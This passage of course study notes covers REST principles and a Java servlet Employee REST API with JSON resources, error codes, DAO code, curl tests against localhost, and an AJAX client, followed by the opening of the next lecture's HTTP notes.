  - [[#API Endpoints|API Endpoints]]
  - [[#JSON Resource Format|JSON Resource Format]]
  - [[#Error Codes|Error Codes]]
- [[#Implementation — Class Architecture|Implementation — Class Architecture]]
  - [[#Resource Interface and AbstractResource|Resource Interface and AbstractResource]]
  - [[#Message — JSON Error Resource|Message — JSON Error Resource]]
  - [[#Employee — toJSON and fromJSON|Employee — toJSON and fromJSON]]
  - [[#ResourceList|ResourceList]]
  - [[#RestResource Interface and AbstractRR|RestResource Interface and AbstractRR]]
  - [[#checkMethodMediaType|checkMethodMediaType]]
  - [[#CreateEmployeeRR|CreateEmployeeRR]]
  - [[#CreateEmployeeDAO|CreateEmployeeDAO]]
  - [[#RestDispatcherServlet|RestDispatcherServlet]]
  - [[#AbstractDatabaseServlet|AbstractDatabaseServlet]]
  - [[#web.xml and Maven POM|web.xml and Maven POM]]
  - [[#REST Execution Examples|REST Execution Examples]]
- [[#AJAX|AJAX]]
  - [[#Search Employee JSP Page|Search Employee JSP Page]]
  - [[#XMLHttpRequest Pattern|XMLHttpRequest Pattern]]
  - [[#AJAX Employee JS Code|AJAX Employee JS Code]]
- [[#Summary Table|Summary Table]]

---

## REST — The Architectural Paradigm

> [!Important] REST: REpresentational State Transfer
> **REST** is an architectural paradigm that applies the architectural principles of the Web to Web services.
> - Network of **Web resources** where users proceed by following **links** (state transitions)
> - Each link provides the **representation** of the next resource (new state)
> - Features: **simplicity**, **statelessness**, **scalability**
> **Intuition:** REST treats everything as a resource accessible via URL; HTTP methods are the only operations.
![[Pasted image 20260512123223.png|440]]
*Figure 1: REST schema based on resources and representations*

### Resources and URIs

> [!Important] Resource
> - A **resource** is whatever has identity
> - Resources have a **state** that can change over time
> - Resources have a **URI** — unique and global identifier
> - Resources can transfer a **representation** of their state upon request
![[Pasted image 20260512123137.png|620]]
*Figure 2: Example of resource identification through URIs*

> [!Important] URI Templates
> REST uses URI templates to specify resource identification patterns:
> ```
> /student/{badge}/exam/{id}
> ```
> | Resource | URI |
> |----------|-----|
> | List of students | `/student` |
> | Student badge 123456 | `/student/123456` |
> | Exam "webapp" for student 123456 | `/student/123456/exam/webapp` |

### HTTP and REST — Uniform Interface

> [!Important] HTTP as REST's Uniform Interface
> - HTTP is **stateless** — each request must be self-explaining
> - HTTP provides a **uniform interface** via well-defined methods: `GET`, `POST`, `PUT`, `DELETE`
> - HTTP headers/body carry all needed information (no session state on server)

| HTTP Method | CRUD Operation | Example                                    |
| ----------- | -------------- | ------------------------------------------ |
| `POST`      | Create         | `POST /student` — creates new student      |
| `GET`       | Read           | `GET /student/123456` — reads student data |
| `PUT`       | Update         | `PUT /student/123456` — updates student    |
| `DELETE`    | Delete         | `DELETE /student/123456` — deletes student |

### Representations — XML, JSON, HTML

Same resource, multiple representations negotiated via `Accept` header:

> [!Example] XML Representation — GET /student
> ```
> GET /student HTTP/1.1
> Accept: application/xml
> ```
> ```xml
> <?xml version="1.0"?>
> <students xmlns:xlink="http://www.w3.org/1999/xlink">
>   <student badge="123456" xlink:href="http://.../student/123456" />
>   <student badge="123457" xlink:href="http://.../student/123457" />
>   <student badge="123458" xlink:href="http://.../student/123458" />
> </students>
> ```
> `application/xml` can also be requested as `text/xml`.

> [!Example] XML Representation — GET /student/123456
> ```xml
> <?xml version="1.0"?>
> <student xmlns:xlink="http://www.w3.org/1999/xlink" badge="123456" name="Mario" surname="Rossi">
>   <exams>
>     <exam id="webapp" xlink:href="http://.../student/123456/exam/webapp" />
>     <exam id="dbms" xlink:href="http://.../student/123456/exam/dbms" />
>     <exam id="iot" xlink:href="http://.../student/123456/exam/iot" />
>   </exams>
> </student>
> ```

> [!Example] JSON Representation — GET /student
> ```json
> {
>   "students": [
>     { "student": { "badge": 123456, "link": "http://.../student/123456" } },
>     { "student": { "badge": 123457, "link": "http://.../student/123457" } },
>     { "student": { "badge": 123458, "link": "http://.../student/123458" } }
>   ]
> }
> ```

> [!Example] JSON Representation — GET /student/123456
> ```
> GET /student/123456 HTTP/1.1
> Accept: application/json
> ```
> ```json
> {
>    "student": {
>       "badge": 123456,
>       "name": "Mario",
>       "surname": "Rossi",
>       "exams": [
>          { "exam": { "id": "webapp", "link": "http://.../student/123456/exam/webapp" } },
>          { "exam": { "id": "dbms",   "link": "http://.../student/123456/exam/dbms" } }
>       ]
>    }
> }
> ```

> [!Example] HTML Representation — GET /student HTTP/1.1 Accept: text/html
> Returns an HTML table with badge + hyperlinks to each student's URI.

> [!Example] HTML Representation — GET /student/123456 HTTP/1.1 Accept: text/html
> Returns the student data plus a list of hyperlinks to exams such as `webapp`, `dbms`, and `iot`.

### REST Design Principles

1. Identify all **resources** to expose
2. Create a **URI** for each resource, preferably using nouns and verbs
3. Determine which **HTTP methods** are needed for each resource
4. **Link** resources — unveil information by following links
5. Specify the **representation format** (possibly with a schema)
6. **Accurately document** all services

### API Documentation — WADL and OpenAPI

> [!Important] WADL — Web Application Description Language
> - Machine-readable **XML** description of HTTP-based (REST) web services
> - Submitted to W3C by Sun Microsystems on 31 August 2009
> - W3C has **no current plans to standardise** it
> - Can include XML grammars/schemas, query parameters with defaults/options, and different response representations for status codes such as `200` and `400`
> ```xml
> <resources base="http://api.search.yahoo.com/NewsSearchService/V1/">
>   <resource path="newsSearch">
>     <method name="GET" id="search">
>       <request>
>         <param name="appid" type="xsd:string" style="query" required="true" />
>         <param name="query" type="xsd:string" style="query" required="true" />
>       </request>
>       <response status="200">
>         <representation mediatype="application/xml" element="yn:ResultSet" />
>       </response>
>     </method>
>   </resource>
> </resources>
> ```
> Reference: Hadley, M. (2009). *WADL — W3C Member Submission 31 August 2009*

> [!Important] OAI — OpenAPI Initiative
> - **YAML-based** description standard for REST APIs
> - Created by a consortium of industries under the **Linux Foundation**
> - Supersedes/competes with WADL as the de-facto standard
> - Describes servers, paths, methods, path/query parameters, response content types, and reusable schemas under `components`
> ```yaml
> openapi: "3.0.0"
> info:
>   version: 1.0.0
>   title: Swagger Petstore
> paths:
>   /pets:
>     get:
>       summary: List all pets
>       operationId: listPets
>       responses:
>         '200':
>           description: An paged array of pets
>           content:
>             application/json:
>               schema:
>                 $ref: "#/components/schemas/Pets"
>   /pets/{petId}:
>     get:
>       summary: Info for a specific pet
>       parameters:
>         - name: petId
>           in: path
>           required: true
>           schema:
>             type: string
> ```

---

## Employee REST API

### API Endpoints

| URI | Method | Description |
|-----|--------|-------------|
| `/rest/employee` | `GET` | List all employees |
| `/rest/employee` | `POST` | Create a new employee |
| `/rest/employee/{badge}` | `GET` | Read employee by badge |
| `/rest/employee/{badge}` | `PUT` | Update employee by badge |
| `/rest/employee/{badge}` | `DELETE` | Delete employee by badge |
| `/rest/employee/salary/{salary}` | `GET` | Search employees with salary above threshold |

### JSON Resource Format

Three JSON resource types used across the API:

> [!Example] Employee Resource
> ```json
> {
>    "employee": {
>       "badge": 7309,
>       "surname": "Rossi",
>       "age": 34,
>       "salary": 45
>    }
> }
> ```

> [!Example] Message Resource (error/info response)
> ```json
> {
>    "message": {
>       "message": "Unsupported operation.",
>       "error-code": "E500",
>       "error-details": "OPTIONS"
>    }
> }
> ```

> [!Example] ResourceList (collection of employees)
> ```json
> {
>    "resource-list": [
>       { "employee": { "badge": 7309, "surname": "Rossi", "age": 34, "salary": 45 } },
>       { "employee": { "badge": 4076, "surname": "Mori",  "age": 45, "salary": 50 } }
>    ]
> }
> ```

### Error Codes

**Client-side errors (4xx):**

| Error Code | HTTP Status | Status Text | Cause |
|------------|-------------|-------------|-------|
| `E4A1` | 400 | Bad Request | `Accept` header missing (output media type not specified) |
| `E4A2` | 406 | Not Acceptable | Unsupported output media type |
| `E4A3` | 400 | Bad Request | `Content-Type` header missing (input media type not specified) |
| `E4A4` | 415 | Unsupported Media Type | Unsupported input media type |
| `E4A5` | 405 | Method Not Allowed | Unsupported HTTP operation |
| `E4A6` | 404 | Not Found | Unknown resource requested |
| `E4A7` | 400 | Bad Request | Wrong URI format |
| `E4A8` | 400 | Bad Request | Wrong resource provided (e.g., malformed JSON body) |

**Server-side errors (5xx):**

| Error Code | HTTP Status | Status Text | Cause |
|------------|-------------|-------------|-------|
| `E5A1` | 500 | Internal Server Error | Unexpected error while processing resource |
| `E5A2` | 409 | Conflict | Resource already exists (PostgreSQL SQLState `23505`) |
| `E5A3` | 404 | Not Found | Resource not found |
| `E5A4` | 409 | Conflict | Cannot modify — other resources depend on it |

---

## Implementation — Class Architecture

![[rest-employee-class-diagram.jpg|430]]
*Figure 3: UML diagram of the Resource, RestResource, DAO, and RestDispatcherServlet hierarchy*

![[rest-create-employee-sequence.jpg|560]]
*Figure 4: Employee creation sequence through a REST endpoint*

### Resource Interface and AbstractResource

![[rest-resource-interface.jpg|560]]
*Figure 5: Resource interface with the method used to serialize a resource to JSON*

> [!Important] Resource Interface
> ```java
> public interface Resource {
>     void toJSON(OutputStream out) throws IOException;
> }
> ```
> All JSON-serialisable domain objects implement `Resource`. `toJSON()` writes JSON to any `OutputStream` (e.g., `res.getOutputStream()`).

> [!Example] AbstractResource — JSON Factory Setup
> ```java
> public abstract class AbstractResource implements Resource {
>
>     protected static final JsonFactory JSON_FACTORY;
>
>     static {
>         JSON_FACTORY = new JsonFactory();
>         JSON_FACTORY.disable(JsonGenerator.Feature.AUTO_CLOSE_TARGET);
>         JSON_FACTORY.disable(JsonParser.Feature.AUTO_CLOSE_SOURCE);
>     }
>
>     @Override
>     public void toJSON(final OutputStream out) throws IOException {
>         if (out == null) throw new IOException("The output stream cannot be null.");
>         try {
>             writeJSON(out);
>         } catch (Exception e) {
>             throw new IOException("Unable to serialize the resource to JSON.", e);
>         }
>     }
>
>     protected abstract void writeJSON(OutputStream out) throws Exception;
> }
> ```
> **Key points:**
> - `AUTO_CLOSE_TARGET` disabled — factory does not close the servlet's response stream
> - `AUTO_CLOSE_SOURCE` disabled — factory does not close the request's input stream
> - `writeJSON()` is the template method subclasses implement

### Message — JSON Error Resource

> [!Example] Message.writeJSON — serialise errors/info messages
> `Message` is a `Resource` used for both errors and informational responses. It writes its JSON representation step by step and flushes the generator at the end:
>
> ```json
> {
>   "message": {
>     "message": "Unsupported operation.",
>     "error-code": "E500",
>     "error-details": "OPTIONS"
>   }
> }
> ```
>
> The same `toJSON(OutputStream)` mechanism is used for normal resources and for error resources, so REST handlers can always write a structured JSON response.

### Employee — toJSON and fromJSON

> [!Example] Employee.writeJSON — serialise to JSON
> Subclass of `AbstractResource`. `writeJSON()` creates a `JsonGenerator` and writes fields step-by-step:
> ```java
> final JsonGenerator jg = JSON_FACTORY.createGenerator(out);
> jg.writeStartObject();
> jg.writeFieldName("employee");
> jg.writeStartObject();
> jg.writeNumberField("badge",   badge);
> jg.writeStringField("surname", surname);
> jg.writeNumberField("age",     age);
> jg.writeNumberField("salary",  salary);
> jg.writeEndObject();
> jg.writeEndObject();
> jg.flush();
> ```

> [!Example] Employee.fromJSON — parse from request body
> Static factory method; uses `JsonParser` to read the incoming request `InputStream`:
> ```java
> public static Employee fromJSON(final InputStream in) throws IOException {
>     int jBadge = -1; String jSurname = null; int jAge = -1; int jSalary = -1;
>
>     final JsonParser jp = JSON_FACTORY.createParser(in);
>
>     // advance until "employee" field name
>     while (jp.getCurrentToken() != JsonToken.FIELD_NAME || !"employee".equals(jp.getCurrentName())) {
>         if (jp.nextToken() == null)
>             throw new EOFException("Unable to parse JSON: no Employee object found.");
>     }
>
>     // read fields inside employee object
>     while (jp.nextToken() != JsonToken.END_OBJECT) {
>         if (jp.getCurrentToken() == JsonToken.FIELD_NAME) {
>             switch (jp.getCurrentName()) {
>                 case "badge":   jp.nextToken(); jBadge   = jp.getIntValue();  break;
>                 case "surname": jp.nextToken(); jSurname = jp.getText();       break;
>                 case "age":     jp.nextToken(); jAge     = jp.getIntValue();  break;
>                 case "salary":  jp.nextToken(); jSalary  = jp.getIntValue();  break;
>             }
>         }
>     }
>     return new Employee(jBadge, jSurname, jAge, jSalary);
> }
> ```
> **Note:** `EOFException` thrown when the `"employee"` token is never found — caught in `CreateEmployeeRR` as `E4A8`.

### ResourceList

> [!Example] ResourceList — generic collection serialiser
> ```java
> public final class ResourceList<T extends Resource> extends AbstractResource {
>
>     private final Iterable<T> list;
>
>     public ResourceList(final Iterable<T> list) {
>         if (list == null) throw new NullPointerException("Resource list cannot be null.");
>         this.list = list;
>     }
>
>     @Override
>     protected void writeJSON(final OutputStream out) throws IOException {
>         final JsonGenerator jg = JSON_FACTORY.createGenerator(out);
>         jg.writeStartObject();
>         jg.writeFieldName("resource-list");
>         jg.writeStartArray();
>         jg.flush();
>
>         boolean firstElement = true;
>         for (final Resource r : list) {
>             if (firstElement) {
>                 r.toJSON(out); jg.flush();
>                 firstElement = false;
>             } else {
>                 jg.writeRaw(','); jg.flush();
>                 r.toJSON(out);   jg.flush();
>             }
>         }
>
>         jg.writeEndArray();
>         jg.writeEndObject();
>         jg.flush();
>     }
> }
> ```
> **Note:** Each resource writes itself via `toJSON(out)` directly; `jg.writeRaw(',')` manually injects array separators because each element uses its own generator instance flushing to the same stream.
> `ResourceList` rejects a `null` iterable in the constructor to avoid generating an invalid JSON array.

### RestResource Interface and AbstractRR

![[rest-restresource-interface.jpg|560]]
*Figure 6: RestResource interface with the serve method used to handle a REST request*

> [!Important] RestResource Interface
> ```java
> public interface RestResource {
>     void serve() throws IOException;
> }
> ```
> Each concrete REST resource (RR) handles one or more HTTP methods for one API endpoint.

> [!Example] AbstractRR — constructor and serve()
> ```java
> public abstract class AbstractRR implements RestResource {
>
>     protected static final String JSON_MEDIA_TYPE      = "application/json";
>     protected static final String JSON_UTF_8_MEDIA_TYPE = "application/json; charset=utf-8";
>     protected static final String ALL_MEDIA_TYPE        = "*/*";
>
>     protected final HttpServletRequest  req;
>     protected final HttpServletResponse res;
>     protected final Connection          con;
>     private   final String              action;
>
>     protected AbstractRR(String action, HttpServletRequest req, HttpServletResponse res, Connection con) {
>         this.action = action;
>         LogContext.setAction(action);
>         this.req = req; this.res = res; this.con = con;
>     }
>
>     @Override
>     public void serve() throws IOException {
>         try {
>             if (!checkMethodMediaType(req, res)) return;
>             doServe();
>         } catch (Throwable t) {
>             final Message m = new Message(
>                 String.format("Unable to serve the REST request: %s.", action), "E5A1", t.getMessage());
>             res.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
>             m.toJSON(res.getOutputStream());
>         } finally {
>             LogContext.removeAction();
>             LogContext.removeResource();
>         }
>     }
>
>     protected abstract void doServe() throws IOException;
> }
> ```
> The real constructor also checks that `req`, `res`, and `con` are not `null`; a REST resource cannot serve a request without the HTTP request, HTTP response, and database connection.

### checkMethodMediaType

> [!Important] checkMethodMediaType — validation logic
> Called at start of every `serve()`. Validates `Accept` and `Content-Type` headers, returns `false` (and writes error JSON) if invalid.
> ```
> Accept header missing?          → E4A1, 400
> Accept not JSON or */*?         → E4A2, 406
> Method = GET or DELETE:         → OK (no body expected)
> Method = POST or PUT:
>   Content-Type missing?         → E4A3, 400
>   Content-Type not JSON?        → E4A4, 415
> Method = anything else:         → E4A5, 405
> ```
> Subclasses may override `checkMethodMediaType` to implement method-specific behaviour.

### CreateEmployeeRR

> [!Example] CreateEmployeeRR.doServe()
> ```java
> public final class CreateEmployeeRR extends AbstractRR {
>
>     public CreateEmployeeRR(HttpServletRequest req, HttpServletResponse res, Connection con) {
>         super(Actions.CREATE_EMPLOYEE, req, res, con);
>     }
>
>     @Override
>     protected void doServe() throws IOException {
>         Employee e = null; Message m = null;
>         try {
>             final Employee employee = Employee.fromJSON(req.getInputStream());
>             LogContext.setResource(Integer.toString(employee.getBadge()));
>
>             e = new CreateEmployeeDAO(con, employee).access().getOutputParam();
>
>             if (e != null) {
>                 res.setStatus(HttpServletResponse.SC_CREATED);   // 201
>                 e.toJSON(res.getOutputStream());
>             } else {
>                 m = new Message("Cannot create the employee: unexpected error.", "E5A1", null);
>                 res.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
>                 m.toJSON(res.getOutputStream());
>             }
>         } catch (EOFException ex) {
>             m = new Message("Cannot create the employee: no Employee JSON object found in the request.",
>                             "E4A8", ex.getMessage());
>             res.setStatus(HttpServletResponse.SC_BAD_REQUEST);
>             m.toJSON(res.getOutputStream());
>         } catch (SQLException ex) {
>             if ("23505".equals(ex.getSQLState())) {
>                 m = new Message("Cannot create the employee: it already exists.", "E5A2", ex.getMessage());
>                 res.setStatus(HttpServletResponse.SC_CONFLICT);  // 409
>             } else {
>                 m = new Message("Cannot create the employee: unexpected database error.", "E5A1", ex.getMessage());
>                 res.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
>             }
>             m.toJSON(res.getOutputStream());
>         }
>     }
> }
> ```
> **SQLState `23505`** = PostgreSQL unique constraint violation → resource already exists → `E5A2 / 409`.

### CreateEmployeeDAO

> [!Example] CreateEmployeeDAO — INSERT with RETURNING *
> ```java
> public final class CreateEmployeeDAO extends AbstractDAO<Employee> {
>
>     private static final String STATEMENT =
>         "INSERT INTO Ferro.Employee (badge, surname, age, salary) VALUES (?, ?, ?, ?) RETURNING *";
>
>     private final Employee employee;
>
>     public CreateEmployeeDAO(Connection con, Employee employee) {
>         super(con);
>         this.employee = employee;
>     }
>
>     @Override
>     protected final void doAccess() throws SQLException {
>         PreparedStatement pstmt = null;
>         Employee e = null;
>         try {
>             pstmt = con.prepareStatement(STATEMENT);
>             pstmt.setInt(1,    employee.getBadge());
>             pstmt.setString(2, employee.getSurname());
>             pstmt.setInt(3,    employee.getAge());
>             pstmt.setInt(4,    employee.getSalary());
>
>             ResultSet rs = pstmt.executeQuery();
>             if (rs.next()) {
>                 e = new Employee(rs.getInt("badge"), rs.getString("surname"),
>                                  rs.getInt("age"),   rs.getInt("salary"));
>             }
>         } finally {
>             if (pstmt != null) pstmt.close();
>         }
>         outputParam = e;
>     }
> }
> ```

> [!Important] PostgreSQL `RETURNING *`
> `RETURNING *` is a **PostgreSQL extension** to standard SQL. It returns the inserted row as a `ResultSet` immediately after the `INSERT`, allowing the application to read the stored state (e.g., DB-generated defaults) without a second SELECT.
> - `executeQuery()` used (not `executeUpdate()`) because `RETURNING` produces a result set
> - The created `Employee` is set as `outputParam` → retrieved via `dao.getOutputParam()`

### RestDispatcherServlet

![[rest-dispatcher-service-code.jpg|560]]
*Figure 7: service method code in RestDispatcherServlet for dispatching HTTP requests*

![[rest-process-employee-routing.jpg|560]]
*Figure 8: processEmployee routing logic toward the correct REST resources*

> [!Important] RestDispatcherServlet — design
> - Extends `AbstractDatabaseServlet` (inherits JNDI connection pool)
> - **Overrides `service()`** instead of `doGet/doPost` — necessary to handle `PUT`, `DELETE`, and other methods
> - Routing logic:
>   1. Check if URI is under `/rest/employee` → call `processEmployee(req, res)`
>   2. If no route matched → write `E4A6 / 404` with message `"Unknown resource requested."`
>   3. Always flush and close response output stream in `finally`
> - `processEmployee()` matches URI patterns in priority order:
>   - non-employee URI → return `false`, so `service()` can emit `E4A6`
>   - strip the path up to and including `employee`, then inspect the remaining path
>   - `GET /rest/employee` → `ListEmployeeRR`
>   - `POST /rest/employee` → `CreateEmployeeRR`
>   - `GET /rest/employee/{badge}` → `ReadEmployeeRR`
>   - `PUT /rest/employee/{badge}` → `UpdateEmployeeRR`
>   - `DELETE /rest/employee/{badge}` → `DeleteEmployeeRR`
>   - `GET /rest/employee/salary/{salary}` → `SearchEmployeeBySalaryRR`
> - Each RR instantiated with `(req, res, con)` and `.serve()` called
> - If a known URI receives an unsupported method, the dispatcher emits `E4A5 / 405`

### AbstractDatabaseServlet

> [!Example] AbstractDatabaseServlet (same as servlet-database lecture)
> ```java
> public abstract class AbstractDatabaseServlet extends HttpServlet {
>     private DataSource ds;
>
>     public void init(ServletConfig config) throws ServletException {
>         try {
>             InitialContext cxt = new InitialContext();
>             ds = (DataSource) cxt.lookup("java:/comp/env/jdbc/employee-ferro");
>         } catch (NamingException e) {
>             ds = null;
>             throw new ServletException("Unable to acquire the connection pool to the database", e);
>         }
>     }
>
>     public void destroy() { ds = null; }
>
>     protected final Connection getConnection() throws SQLException {
>         return ds.getConnection();
>     }
> }
> ```

### web.xml and Maven POM

> [!Example] web.xml — route all /rest/* to RestDispatcherServlet
> Every request under `/rest` is forwarded to `RestDispatcherServlet`:
> ```xml
> <servlet>
>   <servlet-name>RestManagerServlet</servlet-name>
>   <servlet-class>it.unipd.dei.webapp.servlet.RestDispatcherServlet</servlet-class>
> </servlet>
> <servlet-mapping>
>   <servlet-name>RestManagerServlet</servlet-name>
>   <url-pattern>/rest/*</url-pattern>
> </servlet-mapping>
> <resource-ref>
>   <description>Connection pool to the database</description>
>   <res-ref-name>jdbc/employee-ferro</res-ref-name>
>   <res-type>javax.sql.DataSource</res-type>
>   <res-auth>Container</res-auth>
> </resource-ref>
> ```

> [!Example] Maven POM — Jackson dependency
> Jackson must NOT have `provided` scope (it is not bundled with Tomcat):
> ```xml
> <dependency>
>     <groupId>com.fasterxml.jackson.core</groupId>
>     <artifactId>jackson-core</artifactId>
>     <version>2.14.2</version>
>     <!-- no <scope>provided</scope> -->
> </dependency>
> ```

### REST Execution Examples

> [!Example] curl examples
> The slides test the API with `curl -v`, showing request headers, status line, `Content-Type: application/json;charset=utf-8`, and JSON response bodies.
>
> ```bash
> curl -v -G http://localhost:8080/employee-rest-jdbc-1.00/rest/employee
> curl -v -G http://localhost:8080/employee-rest-jdbc-1.00/rest/employee/2
> curl -v -X DELETE http://localhost:8080/employee-rest-jdbc-1.00/rest/employee/2
> curl -v -X POST -H "Content-Type: application/json" \
>   -d "{\"employee\":{\"badge\":6137,\"surname\":\"Schiavon\",\"age\":97,\"salary\":138}}" \
>   http://localhost:8080/employee-rest-jdbc-1.00/rest/employee
> curl -v -X PUT -H "Content-Type: application/json" \
>   -d "{\"employee\":{\"badge\":6137,\"surname\":\"Pavon\",\"age\":97,\"salary\":138}}" \
>   http://localhost:8080/employee-rest-jdbc-1.00/rest/employee/6137
> curl -v -G http://localhost:8080/employee-rest-jdbc-1.00/rest/employee/salary/45
> ```
>
> `GET`, `DELETE`, `PUT`, and salary search return `200` on success in the examples; create returns `201 Created`.

---

## AJAX

> [!Important] AJAX — Asynchronous JavaScript and XML
> **AJAX** allows web pages to send HTTP requests and update the DOM without full page reloads.
> - Uses `XMLHttpRequest` (XHR) object
> - Response body parsed with `JSON.parse()`
> - DOM updated programmatically via `document.createElement()` / `appendChild()`
> - Decouples the REST API call from the page lifecycle

### Search Employee JSP Page

> [!Example] search-employee-form.jsp — hook points for AJAX
> ```jsp
> <%@ page contentType="text/html;charset=utf-8" %>
> <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
>
> <label for="salaryID">Salary:</label>
> <input id="salaryID" type="text"/><br/><br/>
> <button type="submit" id="ajaxButton">Submit</button><br/>
>
> <div id="results" style="margin: 2em;"></div>
>
> <script type="text/javascript" src="<c:url value="/js/ajax_employee.js"/>"></script>
> ```
>
> The JavaScript reads `salaryID`, attaches the click listener to `ajaxButton`, and writes results into `results`. The slide explicitly marks the inline `style` attribute as bad practice.

### XMLHttpRequest Pattern

```
1. Get form input value
2. Build request URL (append parameters)
3. Create XMLHttpRequest object
4. Set xhr.onreadystatechange = processResponse callback
5. xhr.open("GET", url, true)   // async = true
6. xhr.send()
```

```
processResponse(xhr):
  if xhr.readyState !== XMLHttpRequest.DONE → return
  get result div
  div.replaceChildren()          // clear previous results
  if xhr.status !== 200 → write error text, return
  const resourceList = JSON.parse(xhr.responseText)["resource-list"]
  for each item in resourceList:
      let employee = item.employee
      create <tr> with <td> for badge, surname, age, salary
      append to table → append to div
```

### AJAX Employee JS Code

![[rest-ajax-event-listener.jpg|560]]
*Figure 9: Event listener registration used to start the AJAX search*

![[rest-ajax-xhr-request.jpg|560]]
*Figure 10: Construction and sending of the XMLHttpRequest used to search employees*

> [!Warning] Client-side Input Not Validated
> Slide 52 explicitly notes `[not safe enough, validation!]` — salary value read from form is appended directly to the URL without sanitisation. Always validate/encode user input before constructing request URLs.

![[rest-ajax-process-response.jpg|560]]
*Figure 11: AJAX response handling and dynamic construction of the HTML table*

![[rest-ajax-json-parse-dom.jpg|560]]
*Figure 12: JSON response parsing and DOM element creation*

> [!Example] Full AJAX JS skeleton
> ```javascript
> // setup
> document.getElementById("ajaxButton")
>         .addEventListener("click", searchEmployeeBySalary);
> console.log("Event listener added to ajaxButton.");
>
> function searchEmployeeBySalary() {
>     const salary = document.getElementById("salaryID").value;
>     console.log("Salary threshold: %d.", salary);
>     const url    = "http://localhost:8080/employee-rest-ajax-1.00/rest/employee/salary/" + salary;
>     console.log("Request URL: %s.", url);
>
>     const xhr = new XMLHttpRequest();
>     if (!xhr) {
>         console.log("Cannot create an XMLHttpRequest instance.");
>         alert("Giving up :( Cannot create an XMLHttpRequest instance");
>         return false;
>     }
>
>     xhr.onreadystatechange = function () { processResponse(this); };
>     console.log("Performing the HTTP GET request.");
>     xhr.open("GET", url, true);
>     xhr.send();
>     console.log("HTTP GET request sent.");
> }
>
> function processResponse(xhr) {
>     if (xhr.readyState !== XMLHttpRequest.DONE) {
>         console.log("Request state: %d. [0 = UNSENT; 1 = OPENED; 2 = HEADERS_RECEIVED; 3 = LOADING]", xhr.readyState);
>         return;
>     }
>
>     const div = document.getElementById("results");
>     div.replaceChildren();
>
>     if (xhr.status !== 200) {
>         console.log("Request unsuccessful: HTTP status = %d.", xhr.status);
>         console.log(xhr.response);
>         div.appendChild(document.createTextNode("Unable to perform the AJAX request."));
>         return;
>     }
>
>     const table = document.createElement("table");
>     div.appendChild(table);
>
>     const e = document.createElement("tbody");
>     table.appendChild(e);
>
>     const resourceList = JSON.parse(xhr.responseText)["resource-list"];
>     for (let i = 0; i < resourceList.length; i++) {
>         let employee = resourceList[i].employee;
>         let ee = document.createElement("tr");
>         e.appendChild(ee);
>         // badge cell
>         let eee = document.createElement("td");
>         eee.appendChild(document.createTextNode(employee["badge"]));
>         ee.appendChild(eee);
>         // surname, age, salary — same pattern
>     }
> }
> ```

---

## Summary Table

| Component | Type | Role | Key Detail |
|-----------|------|------|------------|
| `Resource` | Interface | JSON-serialisable object | `toJSON(OutputStream)` |
| `AbstractResource` | Abstract class | Manages `JsonFactory`, delegates to `writeJSON()` | Disables auto-close on streams |
| `Employee` | Concrete resource | Domain object; JSON ↔ Java | `fromJSON()` static parser; `writeJSON()` serialiser |
| `Message` | Concrete resource | Error/info response | Fields: `message`, `error-code`, `error-details` |
| `ResourceList<T>` | Concrete resource | Collection wrapper | `writeRaw(',')` hack for array separators |
| `RestResource` | Interface | REST request handler | `void serve() throws IOException` |
| `AbstractRR` | Abstract class | Validates headers, wraps `doServe()`, catches `Throwable` | `checkMethodMediaType()` |
| `CreateEmployeeRR` | Concrete RR | POST /rest/employee | Parses JSON body → DAO → 201 or error |
| `RestDispatcherServlet` | Servlet | Front controller for REST | Overrides `service()`; routes to RR by URI+method |
| `AbstractDatabaseServlet` | Abstract servlet | JNDI connection pool | `init()` JNDI lookup; `getConnection()` |
| `CreateEmployeeDAO` | DAO | INSERT employee | `RETURNING *` → sets `outputParam` |
| `web.xml` REST mapping | Deployment descriptor | Routes `/rest/*` | `RestManagerServlet` → `RestDispatcherServlet` |
| Jackson Core | Maven dependency | JSON parser/generator | `com.fasterxml.jackson.core:jackson-core:2.14.2` |
| `curl -v` | CLI HTTP client | API execution examples | Shows status, headers, JSON body |
| `search-employee-form.jsp` | JSP page | AJAX trigger page | `salaryID`, `ajaxButton`, `results`, JS include |
| `XMLHttpRequest` | Browser API | Async HTTP from client | `onreadystatechange`, `readyState === DONE` |
| WADL | XML format | REST API description | W3C submission 2009, not standardised |
| OpenAPI (OAI) | YAML format | REST API description | Linux Foundation standard, de-facto |
| `application/json` | MIME type | JSON media type | Required in `Accept` + `Content-Type` for POST/PUT |

## Questions

1. What does REST mean by treating application data as resources, and how do URIs identify those resources?
2. How do HTTP methods such as `GET`, `POST`, `PUT`, and `DELETE` map to CRUD operations in a REST API?
3. Why is statelessness important for REST services, and what information must each request carry because of it?
4. How can the same resource have different representations such as XML, JSON, or HTML, and what role does the `Accept` header play?
5. How should URI templates describe resources and operations in a REST API?
6. How do WADL and OpenAPI differ as ways to document REST APIs, and why is OpenAPI more relevant in modern practice?
7. How do the Employee REST API endpoints distinguish collection resources, single resources, and filtered resources such as salary searches?
8. What information is carried by the `Employee`, `Message`, and `ResourceList` JSON formats?
9. How do client-side error codes such as `E4A1` to `E4A8` differ from server-side error codes such as `E5A1` to `E5A4`?
10. Why does the `Resource` interface write JSON to an `OutputStream`, and why does `AbstractResource` disable auto-closing of streams?
11. How does `Employee.fromJSON()` parse an incoming request body, and what kind of malformed input leads to `E4A8`?
12. Why does `ResourceList` need to coordinate multiple resources writing JSON into a single array?
13. What responsibilities does `AbstractRR` centralize before and after each concrete REST resource handles a request?
14. How does `checkMethodMediaType()` enforce correct use of `Accept`, `Content-Type`, and HTTP methods?
15. Why does `RestDispatcherServlet` override `service()` instead of only implementing `doGet()` or `doPost()`?
16. How does PostgreSQL `RETURNING *` change the implementation of `CreateEmployeeDAO` compared with a plain insert?
17. How does the AJAX example connect a browser event, an `XMLHttpRequest`, a REST endpoint, JSON parsing, and DOM updates?

# 09 — HTTP (and Surroundings)

_Source: `09-Webapp-2025-26-HTTP.pdf` — Web Applications, Master Degree, A.Y. 2025/2026, Prof. Nicola Ferro_

---

## Table of Contents

- [[#Basic Web Technology|Basic Web Technology]]
- [[#URL and URI|URL and URI]]
  - [[#URI URL URN IRI|URI, URL, URN, IRI]]
  - [[#URI Syntax|URI Syntax]]
  - [[#URI Examples|URI Examples]]
  - [[#Percent-Encoding|Percent-Encoding]]
- [[#Character Encoding|Character Encoding]]
  - [[#ASCII|ASCII]]
